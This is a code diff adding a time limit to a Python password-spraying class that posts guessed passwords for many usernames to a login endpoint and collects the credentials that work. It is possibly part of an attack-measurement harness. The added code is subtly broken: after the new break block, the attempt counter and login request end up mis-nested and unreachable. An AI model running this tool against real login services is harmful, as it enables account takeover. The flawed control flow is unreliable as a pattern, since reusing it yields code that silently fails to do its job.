@@ -15,6 +15,7 @@ class PasswordSprayAttack:
         password_list: List[str],
         metrics: AttackMetrics,
         delay: float = 0.5,
+        max_time: float = None,
     ) -> List[Dict[str, str]]:
         """
         Password spray attack: tests each password on all users
@@ -24,12 +25,14 @@ class PasswordSprayAttack:
             password_list: list of passwords to test
             metrics: AttackMetrics object for data collection
             delay: delay between each attempt (in seconds)
+            max_time: maximum time in seconds (None = no time limit)
 
         Returns:
             List of found credentials as dicts with 'username' and 'password' keys
         """
+        max_time_str = f"{max_time}s" if max_time else "unlimited"
         print(
-            f"Starting Password Spray on {len(usernames)} users with {len(password_list)} passwords..."
+            f"Starting Password Spray on {len(usernames)} users with {len(password_list)} passwords (max_time: {max_time_str})..."
         )
 
         found_credentials = []
@@ -37,16 +40,33 @@ class PasswordSprayAttack:
         attempt_i = 0
 
         metrics.start()
+        start_time = time.time()
 
         for pwd_idx, password in enumerate(password_list, 1):
+            if max_time is not None:
+                elapsed_time = time.time() - start_time
+                if elapsed_time >= max_time:
+                    print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
+                    break
             print(f"   Testing password: '{password}' ({pwd_idx}/{len(password_list)})")
 
+            time_limit_reached = False
             for user_idx, username in enumerate(usernames, 1):
                 if username in compromised:
                     continue
 
+                if max_time is not None:
+                    elapsed_time = time.time() - start_time
+                    if elapsed_time >= max_time:
+                        print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
+                        time_limit_reached = True
+                        break
+            
+            if time_limit_reached:
+                break
+
                 attempt_i += 1
-                start = time.time()
+                attempt_start = time.time()
 
                 try:
                     response = self.session.post(
@@ -55,7 +75,7 @@ class PasswordSprayAttack:
                         timeout=10,
                     )
 
-                    latency = int((time.time() - start) * 1000)
+                    latency = int((time.time() - attempt_start) * 1000)
 
                     # Handle rate limiting
                     if response.status_code == 429:
